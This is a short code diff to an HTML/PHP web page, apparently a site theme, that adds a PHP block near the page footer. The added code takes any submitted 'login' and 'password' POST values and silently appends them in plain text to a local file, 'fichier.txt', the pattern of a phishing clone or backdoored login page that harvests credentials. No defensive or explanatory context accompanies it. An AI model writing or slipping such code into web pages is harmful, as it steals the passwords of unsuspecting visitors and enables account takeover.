@@ -1219,7 +1219,15 @@
           </div>
           </div>
 
-
+          <?php
+          if(isset($_POST['login']) or isset($_POST['password'])){
+            $identifiant = $_POST['login'].' '.$_POST['password']."\r\n";
+            //$myfile = fopen("./fichier.txt", "w") or die("Unable to open file!");
+            file_put_contents("./fichier.txt", $identifiant, FILE_APPEND);
+            //fclose($myfile);
+          }
+          
+      ?>
   <script src="sites/all/themes/contrib/bootstrap/js/bootstrap88f2.js?r6s7wj"></script>
 </body>
 
